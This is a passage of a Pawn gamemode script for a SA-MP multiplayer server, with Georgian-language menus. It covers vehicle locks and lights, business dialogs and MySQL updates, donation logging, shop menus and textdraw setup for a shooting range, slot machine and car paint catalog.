		gVehicles[vehicleid-1][vLock] = 0;
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			SetVehicleParamsForPlayer(vehicleid,i,0,0);
		}
		return false;
	}
	else
	{
		gVehicles[vehicleid-1][vLock] = 1;
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			SetVehicleParamsForPlayer(vehicleid,i,0,1);
		}
		return true;
	}
}

stock ToggleLamp(vehicleid)
{
	new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	if(lights <= 0) lights = 1;
	else lights = 0;
	SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
}

stock GetLamp(vehicleid)
{
	new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	return lights;
}

stock ShowMakeGunList(playerid)
{
    new mes2[128];
	for(new i;i<6;i++)
	{
		new gunname[24];
		GetWeaponName(gGunID[i],gunname,24);
		if(!i) format(mes2,sizeof(mes2),"%d. %s",i+1,gunname);
		else format(mes2,sizeof(mes2),"%s\n%d. %s",mes2,i+1,gunname);
	}
	ShowPlayerDialog(playerid,dMakeGun,2,"Iaragis Sawyobi",mes2,"NEXT","CLOSE");
}

GetFloatDifference(Float: Number1, Float: Number2) return floatround(Number1 > Number2 ? Number1 - Number2 : Number2 - Number1);

stock GetSubfractionID(fractionid)
{
	switch(fractionid)
	{
		case 1: return false;
		case 7: return true;
		case 8: return 2;
	}
	return -1;
}

#include <anticrash>

stock GetClosestPlayer(playerid,&Float:distance)
{
	new world = GetPlayerVirtualWorld(playerid);
	distance = 5000.0;
	new id = -1;
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || i == playerid || GetPlayerVirtualWorld(i) != world) continue;
		new Float: dist;
		dist = GetPlayerDistanceToPlayer(playerid,i);
		if(dist < distance) {id = i; distance = dist;}
	}
	return id;
}

stock IsGang(fraction)
{
	if(fraction >= 3 && fraction <= 7) return true;
	else return false;
}

stock del(op1,op2)
{
	new result;
	result = op1/op2;
	if(op1%op2) result += 1;
	return result;
}

stock abs( value )
{
    return ((value < 0 ) ? (-value) : (value));
}

stock GetFreeSeat(vehicleid)
{
	if(!vehicleid) return -1;
	new model = GetVehicleModel(vehicleid);
	new maxs = GetMaxSeat(model) - 1;
	new bool:seat[3],cnt;
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(!IsPlayerConnected(i) || GetPlayerVehicleID(i) != vehicleid) continue;
		new pseat = GetPlayerVehicleSeat(i);
		if(pseat < 1 || pseat > 3) continue;
		seat[pseat-1] = true;
		cnt++;
		if(cnt >= maxs) return -1;
	}
	for(new i;i<3;i++) if(!seat[i]) return i+1;
	return -1;
}

stock GetMaxSeat(modelid)
{
	switch(modelid)
	{
		case 596..598,427,490: return 4;
		case 599,497,528: return 2;
	}
	return -1;
}

stock UpdateBusinessText(id)
{
	if(id < 0 || id >= MAX_BUSINESS_COUNT || !gBusiness[id][busiID]) return -1;
	new mes2[200];
	if(gBusiness[id][busiStatus]) format(mes2,sizeof(mes2),"{FFEE00}%s\n{"#cWHITE"}Mewarme: {2F8F5F}%s\n{"#cWHITE"}Girebuleba: {ED8A18}%d$",gBusiness[id][busiName],gBusiness[id][busiOwner],gBusiness[id][busiSellPrice]);
	else strcat(mes2,"\t\t\t{"#cRED"}Biznesi Daketilia\n{"#cGRAY"}Informacia Ar Aris Xelmisawvdomi");
	UpdateDynamic3DTextLabelText(gBusinessText[id],CWHITE,mes2);
	return true;
}

stock UpdateBusinessData(id,field[],data)
{
	new query[128];
	format(query,sizeof(query),"UPDATE `business` SET `%s` = '%d' WHERE `id` = '%d'",field,data,id);
	mysql_empty(mysql, query);
	return mysql_errno();
}

stock UpdateBusinessDataEx(id,field1[],data1,field2[],data2)
{
	new query[128];
	format(query,sizeof(query),"UPDATE `business` SET `%s` = '%d', `%s` = '%d' WHERE `id` = '%d'",field1,data1,field2,data2,id);
	mysql_empty(mysql, query);
	return mysql_errno();
}

stock ShowBusinessInformation(playerid,id,dialogid)
{
	new status[24];
	new mes2[512];
	new type = gBusiness[id][busiType] - 1;
	if(gBusiness[id][busiStatus]) strcat(status,"{"#cGREEN"}Gagebuli");
	else strcat(status,"{"#cRED"}Daketili");
	format(mes2,sizeof(mes2),"{"#cORANGE"}Dasaxeleba:\t{"#cWHITE"}%s\n{"#cORANGE"}Tipi:\t\t{"#cWHITE"}%s\n{"#cORANGE"}Mflobeli:\t{"#cWHITE"}%s\n{"#cORANGE"}Stumrobis. Fasi\t{"#cWHITE"}$%d\n{"#cORANGE"}Klasi:\t\t{"#cWHITE"}$%d\n{"#cORANGE"}Produqtis Fasi:\t{"#cWHITE"}$%d\n{"#cORANGE"}Produqtis Raodenoba:\t{"#cWHITE"}%d ед.\n{"#cORANGE"}Mdgomareoba:\t{"#cWHITE"}%s",gBusiness[id][busiName],gBusinessTypeName[type],gBusiness[id][busiOwner],
	gBusiness[id][busiSellPrice],gBusiness[id][busiBank],gBusiness[id][busiPrice],gBusiness[id][busiProduct],status);
	ShowPlayerDialog(playerid,dialogid,0,"Biznesi",mes2,"OK","");
	return true;
}

stock GetVehicleType( model ) {
	switch ( model ) {
		case 2000: return VEHICLE_TYPE_BOAT;
		case 17,25,47,69,87,88,148,163,60,111,112,113,119,120,153,157,192,193: return VEHICLE_TYPE_PLANE;
		default: return VEHICLE_TYPE_CAR;
	}
	return VEHICLE_TYPE_CAR;
}

stock ShowAdvertList(playerid)
{
	new adlist[900];
	for(new i; i < MAX_ADVERT_COUNT; i++)
	{
	    if(!gAdvert[i][adBusy]) format(adlist,sizeof(adlist),"%s%d. -\n",adlist,i+1);
	    else format(adlist,sizeof(adlist),"%s%d. %s [{ffff00}Elodeba{ffffff}]\n",adlist,i+1,gAdvert[i][adSender]);
	}
	ShowPlayerDialog(playerid,dAdvertList,2,"Gancxadebebi",adlist,"OK","CLOSE");
	return true;
}

stock DonateLog(playerid,money,type)
{
	new query[128];
	new y,m,d,h,mi,s;
	getdate(y,m,d);
	gettime(h,mi,s);
	format(query,sizeof(query),"INSERT INTO `donate` VALUES('','%d-%d-%d %d:%d:%d','%d','%d','%d');",y,m,d,h,mi,s,pData[playerid][pMysqlID],money,type);
	mysql_empty(mysql, query);
}

stock UpdateDonate(playerid)
{
	new query[128];
	format(query,sizeof(query),"SELECT `donate` FROM `members` WHERE `nickname` = '%s'",Name2(playerid));
	mysql_tquery(mysql, query, "UpdateDonate", "d", playerid);
}

stock SaveNewsMoney() {
	new query[128];
	format(query, sizeof(query), "UPDATE `serverdata` SET `gnewsmoney` = %i", gNewsMoney);
	mysql_empty(mysql, query);
}

stock NewKick(playerid) {
    SetTimerEx("KickPublic", 1000, false, "d", playerid);
    SetPVarInt(playerid, "kicked", 1);
    return true;
}

forward KickPublic(playerid);
public KickPublic(playerid) {
    if(IsPlayerConnected(playerid)) {
		ResetPlayerWeaponsEx(playerid);
		DeletePVar(playerid, "kicked");
	 	Kick(playerid);
	}
}

stock GetVehicleRotation(vehicleid,&Float:x,&Float:y,&Float:z) {
    new Float:quat_w,Float:quat_x,Float:quat_y,Float:quat_z;
    GetVehicleRotationQuat(vehicleid,quat_w,quat_x,quat_y,quat_z);
    x = atan2(2*((quat_x*quat_y)+(quat_w+quat_z)),(quat_w*quat_w)+(quat_x*quat_x)-(quat_y*quat_y)-(quat_z*quat_z));
    y = atan2(2*((quat_y*quat_z)+(quat_w*quat_x)),(quat_w*quat_w)-(quat_x*quat_x)-(quat_y*quat_y)+(quat_z*quat_z));
    z = asin(-2*((quat_x*quat_z)+(quat_w*quat_y)));
    return true;
}

stock ShowPlayerEateryTD(playerid, id) {
	new mes2[300];
	format(mes2,sizeof(mes2),"{FFFFFF}1. Burgeri | {3B8212}%d$\n{FFFFFF}2. Salati | {3B8212}%d$\n{FFFFFF}3. Shaurma | {3B8212}%d$\n{FFFFFF}4. Sasmeli | {3B8212}%d$", gBusiness[id][busiPrice] * gEateryCosts[0],gBusiness[id][busiPrice] * gEateryCosts[1],gBusiness[id][busiPrice] * gEateryCosts[2],gBusiness[id][busiPrice] * gEateryCosts[3]);
	ShowPlayerDialog(playerid, dBuyFood, DIALOG_STYLE_LIST, "{"#cGREEN"}Sasauzme: {ffffff}Menu", mes2, "Yidva", "Daxurva");
}

stock ShowPlayerBarTD(playerid, id) {
	new mes2[400];
	format(mes2,sizeof(mes2),"{FFFFFF}1. Ludi | {3B8212}%d$\n{FFFFFF}2. Vodka | {3B8212}%d$\n{FFFFFF}3. Brandy | {3B8212}%d$\n{FFFFFF}4. Gvino | {3B8212}%d$\n{FFFFFF}5. Shaurma | {3B8212}%d$", gBusiness[id][busiPrice] * gBarCosts[0],gBusiness[id][busiPrice] * gBarCosts[1],gBusiness[id][busiPrice] * gBarCosts[2],gBusiness[id][busiPrice] * gBarCosts[3],gBusiness[id][busiPrice] * gBarCosts[4]);
	ShowPlayerDialog(playerid, dBar, DIALOG_STYLE_LIST, "{"#cGREEN"}Bar: {ffffff}Menu", mes2, "Yidva", "Daxurva");
}

stock ShowPlayerClothesTD(playerid) {
	for(new x; x < sizeof(gSkinShopDraw); x ++) {
	    TextDrawHideForPlayer(playerid, gSkinShopDraw[x]);
	    TextDrawShowForPlayer(playerid, gSkinShopDraw[x]);
	}
	new skin, price, str[32];
	for(new x; x < sizeof(gSkins); x ++) {
		skin = GetSkinID(pData[playerid][pSex], x);
		price = GetSkinPrice(x);
		if(!skin) continue;
		else SetPlayerSkin(playerid, skin);
		format(str, 32, "~y~$%i", price);
		PlayerTextDrawSetString(playerid, gSkinShopPriceDraw[playerid], str);
		break;
	}
	PlayerTextDrawShow(playerid, gSkinShopPriceDraw[playerid]);
	SelectTextDraw(playerid, 0xAFAFAFAA);
	SetPVarInt(playerid, "clothes_td", 1);
}

stock HidePlayerClothesTD(playerid) {
    for(new x; x < sizeof(gSkinShopDraw); x ++) {
	    TextDrawHideForPlayer(playerid, gSkinShopDraw[x]);
	}
	PlayerTextDrawHide(playerid, gSkinShopPriceDraw[playerid]);
	CancelSelectTextDraw(playerid);
	DeletePVar(playerid, "clothes_td");
}

stock GetSkinID(sex, index) {
	if(index < 0 || index > sizeof(gSkins) - 1) return false;
	if(gSkins[index][skinSex] != sex) return false;
	return gSkins[index][skinID];
}

stock GetSkinPrice(index) {
	if(index < 0 || index > sizeof(gSkins) - 1) return false;
	return gSkins[index][skinPrice];
}
new Bar:qhealth2, Bar:qhealth3, Bar:qhealth4, Bar:qhealth5, Bar:qhealth6;
CreateTextDRAWS()
{
    for(new i;i < sizeof(TirInfo);i ++)
	{
	    Tir_CP[i] = CreateDynamicCP(TirInfo[i][tirPos][0], TirInfo[i][tirPos][1], TirInfo[i][tirPos][2], 1.0, TirInfo[i][tirWorld], TirInfo[i][tirInt], -1, 10.0);
	    TirText[i] = CreateDynamic3DTextLabel("-== Tir ==-\n\n{FFFFFF}Sasroli Adgili",CGREEN,TirInfo[i][tirPos][0], TirInfo[i][tirPos][1], TirInfo[i][tirPos][2],5.0,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, TirInfo[i][tirWorld], TirInfo[i][tirInt]);
	    Target_Object[i] = CreateDynamicObject(1586, TirInfo[i][tirTPos][0], TirInfo[i][tirTPos][1], TirInfo[i][tirTPos][2], TirInfo[i][tirTPos][3], TirInfo[i][tirTPos][4], TirInfo[i][tirTPos][5], TirInfo[i][tirWorld], TirInfo[i][tirInt]);
	}

	TirBGDraw = TextDrawCreate(518,341,"-");
	TextDrawUseBox(TirBGDraw,1);
	TextDrawColor(TirBGDraw,0xFFFFFFFF);//
	TextDrawBackgroundColor(TirBGDraw,0x00000000);
	TextDrawBoxColor(TirBGDraw,0x00000055);
	TextDrawTextSize(TirBGDraw,105.0,40.0);
	TextDrawAlignment(TirBGDraw,2);
	TextDrawLetterSize(TirBGDraw,0.00,5.09);
	TextDrawSetOutline(TirBGDraw,1);
	TextDrawFont(TirBGDraw,0);

	TirDraw[0] = TextDrawCreate(499, 300, "-");
	TextDrawFont(TirDraw[0], 1);
	TextDrawLetterSize(TirDraw[0], 3.5, 8.7);
	TextDrawColor(TirDraw[0], 0xFFFFFFFF);
	TextDrawBackgroundColor(TirDraw[0],0xAFAFAFFF);
	TextDrawSetOutline(TirDraw[0], 1);

	TirDraw[1] = TextDrawCreate(500, 315, "-");
	TextDrawFont(TirDraw[1], 1);
	TextDrawLetterSize(TirDraw[1], 1.47, 8.7);
	TextDrawColor(TirDraw[1], 0xFFFFFFFF);
	TextDrawBackgroundColor(TirDraw[1],0xAFAFAFFF);
	TextDrawSetOutline(TirDraw[1], 1);

	TirDraw[2] = TextDrawCreate(520, 315, "-");
	TextDrawFont(TirDraw[2], 1);
	TextDrawLetterSize(TirDraw[2], 1.47, 8.7);
	TextDrawColor(TirDraw[2], 0xFFFFFFFF);
	TextDrawBackgroundColor(TirDraw[2],0xAFAFAFFF);
	TextDrawSetOutline(TirDraw[2], 1);

	TirDraw[3] = TextDrawCreate(500, 330, "-");
	TextDrawFont(TirDraw[3], 1);
	TextDrawLetterSize(TirDraw[3], 1.47, 8.7);
	TextDrawColor(TirDraw[3], 0xFFFFFFFF);
	TextDrawBackgroundColor(TirDraw[3],0xAFAFAFFF);
	TextDrawSetOutline(TirDraw[3], 1);

	TirDraw[4] = TextDrawCreate(520, 330, "-");
	TextDrawFont(TirDraw[4], 1);
	TextDrawLetterSize(TirDraw[4], 1.47, 8.7);
	TextDrawColor(TirDraw[4], 0xFFFFFFFF);
	TextDrawBackgroundColor(TirDraw[4],0xAFAFAFFF);
	TextDrawSetOutline(TirDraw[4], 1);

    qhealth2 = CreateProgressBar(191.750000, 177.083389, _, _, 0xFF0000FF, 100.0);
	qhealth3 = CreateProgressBar(191.750000, 199.083389, _, _, 0xFF0000FF, 100.0);
	qhealth4 = CreateProgressBar(191.750000, 221.083389, _, _, 0xFF0000FF, 100.0);
	qhealth5 = CreateProgressBar(191.750000, 243.083389, _, _, 0xFF0000FF, 100.0);
	qhealth6 = CreateProgressBar(191.750000, 265.083389, _, _, 0xFF0000FF, 100.0);
	new textz = CreateObject(19353, 1171.6486, -1323.4023, 17.4059, 0.2000, -0.5000, 0.1651);
	SetObjectMaterialText(textz, "HOSPITAL", 0, 50, "Arial", 18, 1, -65536, 0, 1);

    CreateDynamicObject(2325,2236.6172,1600.9479,1000.6591,0.00,0.00,-90.00); // ДЛЯ КАЗИНО
	CreateDynamicObject(19355,247.9900055,87.0930023,1004.3909912,0.0000000,0.0000000,0.0000000); // У военкомата дверь
	// около больницы дверь (/gangjob)
	CreateDynamicObject(1535,1150.0050049,-1355.0880127,12.6650000,0.0000000,0.0000000,90.0000000); //object(gen_doorext14) (1)
	CreateDynamicObject(997,1137.9200439,-1369.2619629,12.9840002,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject(997,1142.4260254,-1369.2829590,12.9840002,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (2)
	CreateDynamicObject(997,1146.4759521,-1369.2299805,12.9840002,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (3)

	new Float:Y = 350.0, Text:Textdraw0;
	Box = CreateBox(194.0,Y-20,3*64.0 + 3*20,84,0x00000077);

	// Cherries (x25)
	Digit1[0] = CreateSprite(214.0,Y,"LD_SLOT:cherry",64,64);
	Digit2[0] = CreateSprite(288.0,Y,"LD_SLOT:cherry",64,64);
	Digit3[0] = CreateSprite(362.0,Y,"LD_SLOT:cherry",64,64);

	// grapes (x100)
	Digit1[1] = CreateSprite(214.0,Y,"LD_SLOT:grapes",64,64);
	Digit2[1] = CreateSprite(288.0,Y,"LD_SLOT:grapes",64,64);
	Digit3[1] = CreateSprite(362.0,Y,"LD_SLOT:grapes",64,64);

	// 69's (x250)
	Digit1[2] = CreateSprite(214.0,Y,"LD_SLOT:r_69",64,64);
	Digit2[2] = CreateSprite(288.0,Y,"LD_SLOT:r_69",64,64);
	Digit3[2] = CreateSprite(362.0,Y,"LD_SLOT:r_69",64,64);

	// bells (x500)
	Digit1[3] = CreateSprite(214.0,Y,"LD_SLOT:bell",64,64);
	Digit2[3] = CreateSprite(288.0,Y,"LD_SLOT:bell",64,64);
	Digit3[3] = CreateSprite(362.0,Y,"LD_SLOT:bell",64,64);

	// Bars [1 bar] (x1000)
	Digit1[4] = CreateSprite(214.0,Y,"LD_SLOT:bar1_o",64,64);
	Digit2[4] = CreateSprite(288.0,Y,"LD_SLOT:bar1_o",64,64);
	Digit3[4] = CreateSprite(362.0,Y,"LD_SLOT:bar1_o",64,64);

	// Bars [2 bar] (x2000)
	Digit1[5] = CreateSprite(214.0,Y,"LD_SLOT:bar2_o",64,64);
	Digit2[5] = CreateSprite(288.0,Y,"LD_SLOT:bar2_o",64,64);
	Digit3[5] = CreateSprite(362.0,Y,"LD_SLOT:bar2_o",64,64);

	VehSelect[0] = TextDrawCreate(627.475830, 127.500022, "usebox");
	TextDrawLetterSize(VehSelect[0], 0.000000, 20.264972);
	TextDrawTextSize(VehSelect[0], 460.898864, 0.000000);
	TextDrawAlignment(VehSelect[0], 1);
	TextDrawColor(VehSelect[0], 0);
	TextDrawUseBox(VehSelect[0], true);
	TextDrawBoxColor(VehSelect[0], 102);
	TextDrawSetShadow(VehSelect[0], 0);
	TextDrawSetOutline(VehSelect[0], 0);
	TextDrawFont(VehSelect[0], 0);

	VehSelect[1] = TextDrawCreate(601.238525, 139.750000, "usebox");
	TextDrawLetterSize(VehSelect[1], 0.000000, 2.239999);
	TextDrawTextSize(VehSelect[1], 486.667572, 0.000000);
	TextDrawAlignment(VehSelect[1], 1);
	TextDrawColor(VehSelect[1], 0);
	TextDrawUseBox(VehSelect[1], true);
	TextDrawBoxColor(VehSelect[1], 102);
	TextDrawSetShadow(VehSelect[1], 0);
	TextDrawSetOutline(VehSelect[1], 0);
	TextDrawFont(VehSelect[1], 0);

	VehSelect[2] = TextDrawCreate(467.584197, 138.250015, "LD_BEAT:left");
	TextDrawLetterSize(VehSelect[2], 0.000000, 0.000000);
	TextDrawTextSize(VehSelect[2], 19.209365, 23.916645);
	TextDrawAlignment(VehSelect[2], 1);
	TextDrawColor(VehSelect[2], -1);
	TextDrawSetShadow(VehSelect[2], 0);
	TextDrawSetOutline(VehSelect[2], 0);
	TextDrawFont(VehSelect[2], 4);
	TextDrawSetSelectable(VehSelect[2], true);

	VehSelect[3] = TextDrawCreate(602.049743, 138.250000, "LD_BEAT:right");
	TextDrawLetterSize(VehSelect[3], 0.000000, 0.000000);
	TextDrawTextSize(VehSelect[3], 18.740829, 23.916687);
	TextDrawAlignment(VehSelect[3], 1);
	TextDrawColor(VehSelect[3], -1);
	TextDrawSetShadow(VehSelect[3], 0);
	TextDrawSetOutline(VehSelect[3], 0);
	TextDrawFont(VehSelect[3], 4);
	TextDrawSetSelectable(VehSelect[3], true);

	VehSelect[4] = TextDrawCreate(484.919738, 171.500000, "Top speed");
	TextDrawLetterSize(VehSelect[4], 0.231199, 0.934997);
	TextDrawAlignment(VehSelect[4], 1);
	TextDrawColor(VehSelect[4], -1);
	TextDrawSetShadow(VehSelect[4], 0);
	TextDrawSetOutline(VehSelect[4], 1);
	TextDrawBackgroundColor(VehSelect[4], 51);
	TextDrawFont(VehSelect[4], 3);
	TextDrawSetProportional(VehSelect[4], 1);

	VehSelect[5] = TextDrawCreate(468.052734, 168.583343, "LD_BEAT:circle");
	TextDrawLetterSize(VehSelect[5], 0.000000, 0.000000);
	TextDrawTextSize(VehSelect[5], 14.055601, 13.999942);
	TextDrawAlignment(VehSelect[5], 1);
	TextDrawColor(VehSelect[5], -1);
	TextDrawSetShadow(VehSelect[5], 0);
	TextDrawSetOutline(VehSelect[5], 0);
	TextDrawFont(VehSelect[5], 4);

	VehSelect[6] = TextDrawCreate(468.521057, 198.333389, "LD_BEAT:triang");
	TextDrawLetterSize(VehSelect[6] , 0.000000, 0.000000);
	TextDrawTextSize(VehSelect[6] , 14.000000, 14.583350);
	TextDrawAlignment(VehSelect[6] , 1);
	TextDrawColor(VehSelect[6] , -1);
	TextDrawSetShadow(VehSelect[6] , 0);
	TextDrawSetOutline(VehSelect[6] , 0);
	TextDrawFont(VehSelect[6] , 4);

	VehSelect[7] = TextDrawCreate(484.450683, 201.250091, "Acceleration");
	TextDrawLetterSize(VehSelect[7], 0.230000, 0.930000);
	TextDrawAlignment(VehSelect[7], 1);
	TextDrawColor(VehSelect[7], -1);
	TextDrawSetShadow(VehSelect[7], 0);
	TextDrawSetOutline(VehSelect[7], 1);
	TextDrawBackgroundColor(VehSelect[7], 51);
	TextDrawFont(VehSelect[7], 3);
	TextDrawSetProportional(VehSelect[7], 1);

	VehSelect[8] = TextDrawCreate(468.521179, 228.083374, "LD_BEAT:cross");
	TextDrawLetterSize(VehSelect[8], 0.000000, 0.000000);
	TextDrawTextSize(VehSelect[8], 14.055632, 13.999983);
	TextDrawAlignment(VehSelect[8], 1);
	TextDrawColor(VehSelect[8], -1);
	TextDrawSetShadow(VehSelect[8], 0);
	TextDrawSetOutline(VehSelect[8], 0);
	TextDrawFont(VehSelect[8], 4);

	VehSelect[9] = TextDrawCreate(485.387908, 231.000015, "Handling");
	TextDrawLetterSize(VehSelect[9], 0.230000, 0.930000);
	TextDrawAlignment(VehSelect[9], 1);
	TextDrawColor(VehSelect[9], -1);
	TextDrawSetShadow(VehSelect[9], 0);
	TextDrawSetOutline(VehSelect[9], 1);
	TextDrawBackgroundColor(VehSelect[9], 51);
	TextDrawFont(VehSelect[9], 3);
	TextDrawSetProportional(VehSelect[9], 1);

	VehSelect[10] = TextDrawCreate(470.863983, 257.833312, "Price:");
	TextDrawLetterSize(VehSelect[10], 0.334010, 1.291666);
	TextDrawAlignment(VehSelect[10], 1);
	TextDrawColor(VehSelect[10], -1);
	TextDrawSetShadow(VehSelect[10], 0);
	TextDrawSetOutline(VehSelect[10], 1);
	TextDrawBackgroundColor(VehSelect[10], 51);
	TextDrawFont(VehSelect[10], 3);
	TextDrawSetProportional(VehSelect[10], 1);

	VehSelect[11] = TextDrawCreate(587.057312, 286.416503, "Continue");
	TextDrawLetterSize(VehSelect[11], 0.376441, 1.582499);
	TextDrawTextSize(VehSelect[11], 10.685214, 55.0);
	TextDrawAlignment(VehSelect[11], 2);
	TextDrawColor(VehSelect[11], -1);
	TextDrawUseBox(VehSelect[11], true);
	TextDrawBoxColor(VehSelect[11], 255);
	TextDrawSetShadow(VehSelect[11], 0);
	TextDrawSetOutline(VehSelect[11], 1);
	TextDrawBackgroundColor(VehSelect[11], 51);
	TextDrawFont(VehSelect[11], 1);
	TextDrawSetProportional(VehSelect[11], 1);
	TextDrawSetSelectable(VehSelect[11], true);

	ColorTD[0] = TextDrawCreate(642.500000, 121.666664, "usebox");
	TextDrawLetterSize(ColorTD[0], 0.000000, 23.846313);
	TextDrawTextSize(ColorTD[0], 485.500000, 0.000000);
	TextDrawAlignment(ColorTD[0], 1);
	TextDrawColor(ColorTD[0], 0);
	TextDrawUseBox(ColorTD[0], true);
	TextDrawBoxColor(ColorTD[0], 102);
	TextDrawSetShadow(ColorTD[0], 0);
	TextDrawSetOutline(ColorTD[0], 0);
	TextDrawFont(ColorTD[0], 0);

	ColorTD[1] = TextDrawCreate(493.842651, 121.333335, "Paint catalog");
	TextDrawLetterSize(ColorTD[1], 0.286500, 1.372498);
	TextDrawAlignment(ColorTD[1], 1);
	TextDrawColor(ColorTD[1], 1941040639);
	TextDrawSetShadow(ColorTD[1], 0);
	TextDrawSetOutline(ColorTD[1], 0);
	TextDrawBackgroundColor(ColorTD[1], 51);
	TextDrawFont(ColorTD[1], 2);
	TextDrawSetProportional(ColorTD[1], 1);

	ColorTD[2] = TextDrawCreate(563.000000, 139.416641, "Primary color");
	TextDrawLetterSize(ColorTD[2], 0.302998, 1.290832);
	TextDrawAlignment(ColorTD[2], 2);
	TextDrawColor(ColorTD[2], -1);
	TextDrawSetShadow(ColorTD[2], 0);
	TextDrawSetOutline(ColorTD[2], 1);
	TextDrawBackgroundColor(ColorTD[2], 51);
	TextDrawFont(ColorTD[2], 2);
	TextDrawSetProportional(ColorTD[2], 1);

	ColorTD[3] = TextDrawCreate(563.000000, 202.416580, "Secondary color");
	TextDrawLetterSize(ColorTD[3], 0.302998, 1.290832);
	TextDrawAlignment(ColorTD[3], 2);
	TextDrawColor(ColorTD[3], -1);
	TextDrawSetShadow(ColorTD[3], 0);
	TextDrawSetOutline(ColorTD[3], 1);
	TextDrawBackgroundColor(ColorTD[3], 51);
	TextDrawFont(ColorTD[3], 2);
	TextDrawSetProportional(ColorTD[3], 1);

	ColorTD[4] = TextDrawCreate(564.000000, 257.249877, "Vinyl");
	TextDrawLetterSize(ColorTD[4], 0.302998, 1.290832);
	TextDrawAlignment(ColorTD[4], 2);
	TextDrawColor(ColorTD[4], -1);
	TextDrawSetShadow(ColorTD[4], 0);
	TextDrawSetOutline(ColorTD[4], 1);
	TextDrawBackgroundColor(ColorTD[4], 51);
	TextDrawFont(ColorTD[4], 2);
	TextDrawSetProportional(ColorTD[4], 1);

	ColorTD[5] = TextDrawCreate(615.000000, 168.583389, "LD_BEAT:right");
	TextDrawLetterSize(ColorTD[5], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[5], 15.500000, 15.750000);
	TextDrawAlignment(ColorTD[5], 1);
	TextDrawColor(ColorTD[5], -1);
	TextDrawSetShadow(ColorTD[5], 0);
	TextDrawSetOutline(ColorTD[5], 0);
	TextDrawFont(ColorTD[5], 4);
	TextDrawSetSelectable(ColorTD[5], true);

	ColorTD[6] = TextDrawCreate(494.500000, 169.166595, "LD_BEAT:left");
	TextDrawLetterSize(ColorTD[6], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[6], 15.500000, 15.750000);
	TextDrawAlignment(ColorTD[6], 1);
	TextDrawColor(ColorTD[6], -1);
	TextDrawSetShadow(ColorTD[6], 0);
	TextDrawSetOutline(ColorTD[6], 0);
	TextDrawFont(ColorTD[6], 4);
	TextDrawSetSelectable(ColorTD[6], true);

	ColorTD[7] = TextDrawCreate(613.500000, 231.583450, "LD_BEAT:right");
	TextDrawLetterSize(ColorTD[7], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[7], 15.500000, 15.750000);
	TextDrawAlignment(ColorTD[7], 1);
	TextDrawColor(ColorTD[7], -1);
	TextDrawSetShadow(ColorTD[7], 0);
	TextDrawSetOutline(ColorTD[7], 0);
	TextDrawFont(ColorTD[7], 4);
	TextDrawSetSelectable(ColorTD[7], true);

	ColorTD[8] = TextDrawCreate(495.000000, 231.583251, "LD_BEAT:left");
	TextDrawLetterSize(ColorTD[8], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[8], 15.500000, 15.750000);
	TextDrawAlignment(ColorTD[8], 1);
	TextDrawColor(ColorTD[8], -1);
	TextDrawSetShadow(ColorTD[8], 0);
	TextDrawSetOutline(ColorTD[8], 0);
	TextDrawFont(ColorTD[8], 4);
	TextDrawSetSelectable(ColorTD[8], true);

	ColorTD[9] = TextDrawCreate(547.000000, 161.000122, "LD_SPAC:white");
	TextDrawLetterSize(ColorTD[9], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[9], 30.500000, 30.333311);
	TextDrawAlignment(ColorTD[9], 1);
	TextDrawColor(ColorTD[9], -1);
	TextDrawSetShadow(ColorTD[9], 0);
	TextDrawSetOutline(ColorTD[9], 0);
	TextDrawFont(ColorTD[9], 4);

	ColorTD[10] = TextDrawCreate(547.000000, 223.999923, "LD_SPAC:white");
	TextDrawLetterSize(ColorTD[10], 0.000000, 0.000000);
	TextDrawTextSize(ColorTD[10], 30.500000, 30.333311);
	TextDrawAlignment(ColorTD[10], 1);
	TextDrawColor(ColorTD[10], -1);
	TextDrawSetShadow(ColorTD[10], 0);
	TextDrawSetOutline(ColorTD[10], 0);
	TextDrawFont(ColorTD[10], 4);

	ColorTD[11] = TextDrawCreate(517.000000, 273.583496, "None");
	TextDrawLetterSize(ColorTD[11], 0.295498, 1.185832);
	TextDrawTextSize(ColorTD[11], 5.000000, 31.499998);
	TextDrawAlignment(ColorTD[11], 2);
	TextDrawColor(ColorTD[11], -1);
	TextDrawUseBox(ColorTD[11], true);
	TextDrawBoxColor(ColorTD[11], 255);
	TextDrawSetShadow(ColorTD[11], 0);
	TextDrawSetOutline(ColorTD[11], 1);
	TextDrawBackgroundColor(ColorTD[11], 51);
	TextDrawFont(ColorTD[11], 2);
	TextDrawSetProportional(ColorTD[11], 1);
	TextDrawSetSelectable(ColorTD[11], true);

	ColorTD[12] = TextDrawCreate(561.500000, 273.583435, "Type 1");
	TextDrawLetterSize(ColorTD[12], 0.295498, 1.185832);
	TextDrawTextSize(ColorTD[12], 5.500000, 40.249980);
	TextDrawAlignment(ColorTD[12], 2);
	TextDrawColor(ColorTD[12], -1);
	TextDrawUseBox(ColorTD[12], true);
	TextDrawBoxColor(ColorTD[12], 255);
	TextDrawSetShadow(ColorTD[12], 0);
	TextDrawSetOutline(ColorTD[12], 1);
	TextDrawBackgroundColor(ColorTD[12], 51);
	TextDrawFont(ColorTD[12], 2);
	TextDrawSetProportional(ColorTD[12], 1);
	TextDrawSetSelectable(ColorTD[12], true);

	ColorTD[13] = TextDrawCreate(612.000000, 273.583496, "Type 2");
	TextDrawLetterSize(ColorTD[13], 0.295498, 1.185832);
	TextDrawTextSize(ColorTD[13], 5.000000, 43.749973);
